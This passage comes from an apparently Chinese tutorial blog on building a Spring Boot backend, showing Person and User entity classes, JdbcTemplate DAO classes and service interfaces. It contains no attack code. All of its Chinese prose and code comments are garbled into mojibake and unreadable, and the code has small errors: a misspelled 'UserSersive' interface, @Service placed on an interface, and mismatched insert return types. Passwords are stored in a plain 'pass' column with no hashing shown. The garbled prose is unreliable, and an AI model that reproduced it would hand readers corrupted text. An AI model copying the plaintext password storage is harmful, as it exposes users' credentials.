è¡¨ã€‚åœ¨æˆ‘ä»¬çš„é¡¹ç›®ä¸­ï¼Œå°±å°†åˆ›å»ºä¸€ä¸ªå®ä½“ç±»Useræ˜ å°„åˆ°æ•°æ®åº“çš„userè¡¨ï¼Œè¡¨ä¸­çš„æ¯ä¸ªå­—æ®µå¯¹åº”äºå®ä½“ç±»çš„æ¯ä¸ªå±æ€§ã€‚</p><ul><li><p>domainï¼šå­˜æ”¾å®ä½“ç±»çš„åŒ…ï¼Œæ¯”å¦‚Userç±»ï¼Œå…¶ä½œä¸ºå¯¹åº”æ•°æ®åº“userè¡¨çš„ä¸€ä¸ªå®ä½“ç±»</p></li><li><p>repository: å­˜æ”¾ä¸€äº›æ•°æ®è®¿é—®ç±»ï¼ˆä¹Ÿå°±æ˜¯ä¸€äº›èƒ½æ“çºµæ•°æ®åº“çš„ç±»ï¼‰çš„åŒ…ï¼Œæ¯”å¦‚å­˜æ”¾èƒ½å¯¹userè¡¨è¿›è¡Œå¢åˆ æ”¹æŸ¥çš„ç±»ï¼Œè¿™ä¸€å±‚ä¹Ÿä»…ä»…å°±æ˜¯åŸºç¡€çš„å¢åˆ æ”¹æŸ¥ï¼Œä¸é™„å¸¦é¢å¤–çš„ä¸šåŠ¡é€»è¾‘ã€‚</p></li></ul></li><li><p>ä¸šåŠ¡é€»è¾‘å±‚</p><p>çš„ä½œç”¨æ˜¯å¤„ç†ä¸šåŠ¡é€»è¾‘ã€‚æ¯”å¦‚åœ¨æœ¬é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬å°±åœ¨ä¸šåŠ¡é€»è¾‘å±‚å®ç°å…·ä½“æ’å…¥åˆ é™¤çš„é€»è¾‘ï¼Œåƒæ˜¯æ’å…¥personè¦è¿å¸¦ç€æ’å…¥userç­‰é€»è¾‘éƒ½å†™åœ¨è¿™é‡Œ</p><ul><li>service: å­˜æ”¾ä¸šåŠ¡é€»è¾‘æ¥å£çš„åŒ…</li><li>serviceImpl: å­˜æ”¾ä¸šåŠ¡é€»è¾‘å®ç°ç±»çš„åŒ…ï¼Œå…¶ä¸­çš„ç±»å®ç°serviceä¸­çš„æ¥å£</li></ul></li><li><p>æ§åˆ¶å±‚</p><p>ä½œç”¨æ˜¯æ¥æ”¶è§†å›¾å±‚çš„è¯·æ±‚å¹¶è°ƒç”¨ä¸šåŠ¡é€»è¾‘å±‚çš„æ–¹æ³•ã€‚æ¯”å¦‚è§†å›¾å±‚è¯·æ±‚æ’å…¥ç”¨æˆ·å¹¶å‘æ¥äº†ç”¨æˆ·çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆæ§åˆ¶å±‚å°±è°ƒç”¨ä¸šåŠ¡é€»è¾‘å±‚çš„ç™»å½•æ–¹æ³•ï¼Œå¹¶å°†ç”¨æˆ·ä¿¡æ¯ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œåœ¨å°†ç»“æœè¿”å›ç»™è§†å›¾å±‚ã€‚</p><ul><li>controller: å­˜æ”¾æ§åˆ¶å™¨çš„åŒ…ã€‚æ¯”å¦‚UserController</li></ul></li><li><p><strong>è§†å›¾å±‚</strong>çš„ä½œç”¨æ˜¯å±•ç°æ•°æ®ï¼Œæœ¬é¡¹ç›®æ˜¯çº¯åç«¯ï¼Œè§†å›¾å±‚åŸºäºåœ¨å‰ç«¯åŸºäºVueå®ç°ï¼Œè§å¦ä¸€ç¯‡åšå®¢ã€‚</p></li><li><p>å‰©ä¸‹çš„utilsåŒ…æä¾›äº†ç»Ÿä¸€è¾“å‡ºç»“æ„çš„å·¥å…·ï¼ŒconfigåŒ…æä¾›äº†è·¨åŸŸé…ç½®ã€‚</p></li></ul><p>å¯ä»¥å‘ç°è¿™æ ·ä¸€ä¸ªæ¶æ„å°±æ˜¯è‡ªåº•å‘ä¸Šçš„ï¼Œæ‰€ä»¥ä¸‹é¢æˆ‘ä»¬æŒ‰ç…§è‡ªåº•å‘ä¸Šæ¥åˆ›å»ºé¡¹ç›®ã€‚</p><p>é¦–å…ˆæŒ‰ç…§ä¸Šå›¾æŠŠé¡¹ç›®ç»“æ„æ­å¥½ï¼Œç„¶åé€ä¸ªå®Œå–„ã€‚</p><h2 id="å››-é¡¹ç›®å®ç°"><a class="markdownIt-Anchor" href="#å››-é¡¹ç›®å®ç°"></a> å››ã€é¡¹ç›®å®ç°</h2><h3 id="1-æ•°æ®æŒä¹…å±‚"><a class="markdownIt-Anchor" href="#1-æ•°æ®æŒä¹…å±‚"></a> 1) æ•°æ®æŒä¹…å±‚</h3><h4 id="1-å®ç°entity"><a class="markdownIt-Anchor" href="#1-å®ç°entity"></a> 1. å®ç°entity</h4><h5 id="person"><a class="markdownIt-Anchor" href="#person"></a> Person</h5><p>é¦–å…ˆåˆ›å»ºPersonç±»ï¼Œç„¶ååˆ›å»ºæ•°æ®è¡¨ä¸­å¯¹åº”çš„å­—æ®µï¼Œæ•°æ®ç±»å‹è¦å¯¹åº”ä¸Š</p><p>æ³¨æ„è¦æ·»åŠ <code>@Table(name = &quot;person&quot;)</code>å’Œ<code>@Entity</code>æ³¨è§£</p><ul><li><strong>@Table(name = â€œpersonâ€)</strong> è¯´æ˜æ­¤å®ä½“ç±»å¯¹åº”äºæ•°æ®åº“çš„personè¡¨</li><li><strong>@Entity</strong> è¯´æ˜æ­¤ç±»æ˜¯ä¸ªå®ä½“ç±»</li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.domain;<br><br><span class="hljs-keyword">import</span> javax.persistence.Entity;<br><span class="hljs-keyword">import</span> javax.persistence.Id;<br><span class="hljs-keyword">import</span> javax.persistence.Table;<br><br><span class="hljs-meta">@Table(name=&quot;person&quot;)</span><br><span class="hljs-meta">@Entity</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-meta">@Id</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br>    <span class="hljs-keyword">private</span> String teleno;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">()</span></span>&#123;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">(String username,String name,Integer age,String teleno)</span></span>&#123;<br>        setUsername(username);<br>        setName(name);<br>        setAge(age);<br>        setTeleno(teleno);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Integer <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(Integer age)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getTeleno</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> teleno;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setTeleno</span><span class="hljs-params">(String teleno)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.teleno = teleno;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h5 id="user"><a class="markdownIt-Anchor" href="#user"></a> User</h5><p>Userå®ç°ç±»åŒç†</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.domain;<br><br><span class="hljs-keyword">import</span> javax.persistence.Entity;<br><span class="hljs-keyword">import</span> javax.persistence.Id;<br><span class="hljs-keyword">import</span> javax.persistence.Table;<br><br><span class="hljs-meta">@Table(name = &quot;users&quot;)</span><br><span class="hljs-meta">@Entity</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-meta">@Id</span><br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">private</span> String pass;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">()</span></span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">(String username, String pass)</span> </span>&#123;<br>        setUsername(username);<br>        setPass(pass);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPass</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> pass;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPass</span><span class="hljs-params">(String pass)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.pass = pass;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="2-å®ç°dao"><a class="markdownIt-Anchor" href="#2-å®ç°dao"></a> 2. å®ç°dao</h4><h5 id="persondao"><a class="markdownIt-Anchor" href="#persondao"></a> PersonDao</h5><p>æ·»åŠ @Repositoryæ³¨è§£,è¡¨ç¤ºå…¶ä¸ºä¸€ä¸ªç»„ä»¶ï¼Œä¹‹åå¯ä»¥é€šè¿‡æ³¨è§£æ³¨å…¥</p><p>åŒæ—¶ä¸ºJdbcTemplateæ·»åŠ @Autowiredæ³¨è§£ï¼Œè¿™æ ·ä¹‹åæ„å»ºæ—¶spring bootå°±ä¼šè‡ªåŠ¨å°†JdbcTemplateæ³¨å…¥è¿›å»äº†ï¼Œä¸éœ€è¦æˆ‘ä»¬è‡ªå·±newã€‚</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.repository;<br><br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.Person;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.jdbc.core.JdbcTemplate;<br><span class="hljs-keyword">import</span> org.springframework.jdbc.core.RowMapper;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Repository;<br><br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-meta">@Repository</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PersonDao</span> </span>&#123;<br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> JdbcTemplate jdbcTemplate;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ–°å¢</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Person <span class="hljs-title">insert</span><span class="hljs-params">(Person person)</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;insert into person values (?,?,?,?)&quot;</span>;<br>        jdbcTemplate.update(sql, person.getUsername(), person.getName(), person.getAge(),person.getTeleno());<br>        <span class="hljs-keyword">return</span> person;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * åˆ é™¤</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">delete</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;delete from person where username = ?&quot;</span>;<br>        jdbcTemplate.update(sql, username);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ›´æ–°</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(Person person)</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;UPDATE person SET name=?, age=?, teleno=? WHERE username=?&quot;</span>;<br>        jdbcTemplate.update(sql, person.getName(), person.getAge(), person.getTeleno(), person.getUsername());<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æŒ‰usernameæŸ¥è¯¢</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Person&gt; <span class="hljs-title">getByUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;select * from person where username=?&quot;</span>;<br>        <span class="hljs-keyword">return</span> jdbcTemplate.query(sql, <span class="hljs-keyword">new</span> RowMapper&lt;Person&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> Person <span class="hljs-title">mapRow</span><span class="hljs-params">(ResultSet rs, <span class="hljs-keyword">int</span> rowNum)</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;<br>                Person person = <span class="hljs-keyword">new</span> Person();<br>                person.setUsername(rs.getString(<span class="hljs-string">&quot;username&quot;</span>));<br>                person.setName(rs.getString(<span class="hljs-string">&quot;name&quot;</span>));<br>                person.setAge(rs.getInt(<span class="hljs-string">&quot;age&quot;</span>));<br>                person.setTeleno(rs.getString(<span class="hljs-string">&quot;teleno&quot;</span>));<br>                <span class="hljs-keyword">return</span> person;<br>            &#125;<br>        &#125;,username);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æŸ¥è¯¢personåˆ—è¡¨</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Person&gt; <span class="hljs-title">getList</span><span class="hljs-params">()</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;select * from person&quot;</span>;<br>        <span class="hljs-keyword">return</span> jdbcTemplate.query(sql, <span class="hljs-keyword">new</span> RowMapper&lt;Person&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> Person <span class="hljs-title">mapRow</span><span class="hljs-params">(ResultSet rs, <span class="hljs-keyword">int</span> rowNum)</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;<br>                Person person = <span class="hljs-keyword">new</span> Person();<br>                person.setUsername(rs.getString(<span class="hljs-string">&quot;username&quot;</span>));<br>                person.setName(rs.getString(<span class="hljs-string">&quot;name&quot;</span>));<br>                person.setAge(rs.getInt(<span class="hljs-string">&quot;age&quot;</span>));<br>                person.setTeleno(rs.getString(<span class="hljs-string">&quot;teleno&quot;</span>));<br>                <span class="hljs-keyword">return</span> person;<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="userdao"><a class="markdownIt-Anchor" href="#userdao"></a> UserDao</h5><p>UserDaoå®ç°åŒç†</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.repository;<br><br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.User;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.jdbc.core.JdbcTemplate;<br><span class="hljs-keyword">import</span> org.springframework.jdbc.core.RowMapper;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Repository;<br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@Repository</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserDao</span> </span>&#123;<br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> JdbcTemplate jdbcTemplate;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ–°å¢</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">insert</span><span class="hljs-params">(User user)</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;insert into users values (?,?)&quot;</span>;<br>        jdbcTemplate.update(sql, user.getUsername(), user.getPass());<br>        <span class="hljs-keyword">return</span> user;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * åˆ é™¤</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">delete</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;delete from users where username = ?&quot;</span>;<br>        jdbcTemplate.update(sql, username);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ›´æ–°</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(User user)</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;UPDATE users SET pass=? WHERE username=?&quot;</span>;<br>        jdbcTemplate.update(sql, user.getPass(), user.getUsername());<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æŒ‰usernameæŸ¥è¯¢</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title">getByUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;select * from users where username=?&quot;</span>;<br>        <span class="hljs-keyword">return</span> jdbcTemplate.query(sql, <span class="hljs-keyword">new</span> RowMapper&lt;User&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">mapRow</span><span class="hljs-params">(ResultSet rs, <span class="hljs-keyword">int</span> rowNum)</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;<br>                User user = <span class="hljs-keyword">new</span> User();<br>                user.setUsername(rs.getString(<span class="hljs-string">&quot;username&quot;</span>));<br>                user.setPass(rs.getString(<span class="hljs-string">&quot;pass&quot;</span>));<br>                <span class="hljs-keyword">return</span> user;<br>            &#125;<br>        &#125;,username);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æŸ¥è¯¢useråˆ—è¡¨</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title">getList</span><span class="hljs-params">()</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;select * from users&quot;</span>;<br>        <span class="hljs-keyword">return</span> jdbcTemplate.query(sql, <span class="hljs-keyword">new</span> RowMapper&lt;User&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">mapRow</span><span class="hljs-params">(ResultSet rs, <span class="hljs-keyword">int</span> rowNum)</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;<br>                User user = <span class="hljs-keyword">new</span> User();<br>                user.setUsername(rs.getString(<span class="hljs-string">&quot;username&quot;</span>));<br>                user.setPass(rs.getString(<span class="hljs-string">&quot;pass&quot;</span>));<br>                <span class="hljs-keyword">return</span> user;<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-ä¸šåŠ¡é€»è¾‘å±‚"><a class="markdownIt-Anchor" href="#2-ä¸šåŠ¡é€»è¾‘å±‚"></a> 2) ä¸šåŠ¡é€»è¾‘å±‚</h3><h4 id="1-å®ç°service"><a class="markdownIt-Anchor" href="#1-å®ç°service"></a> 1. å®ç°service</h4><h5 id="personservice"><a class="markdownIt-Anchor" href="#personservice"></a> PersonService</h5><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.service;<br><br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.Person;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Service;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">PersonService</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">insert</span><span class="hljs-params">(Person person)</span></span>;<br>    <span class="hljs-function">List&lt;Person&gt; <span class="hljs-title">getList</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function">List&lt;Person&gt; <span class="hljs-title">getByUsername</span><span class="hljs-params">(String username)</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="userservice"><a class="markdownIt-Anchor" href="#userservice"></a> UserService</h5><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.service;<br><br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.Person;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.User;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserSersive</span>  </span>&#123;<br>    <span class="hljs-function">User <span class="hljs-title">insert</span><span class="hljs-params">(User user)</span></span>;<br>    <span class="hljs-function">List&lt;User&gt; <span class="hljs-title">getList</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function">List&lt;User&gt; <span class="hljs-title">getByUsername</span><span class="hljs-params">(String username)</span></span>;<br>    <span class="hljs-function">User <span class="hljs-title">delete</span><span class="hljs-params">(String username)</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="2-å®ç°serviceimpl"><a class="markdownIt-Anchor" href="#2-å®ç°serviceimpl"></a> 2. 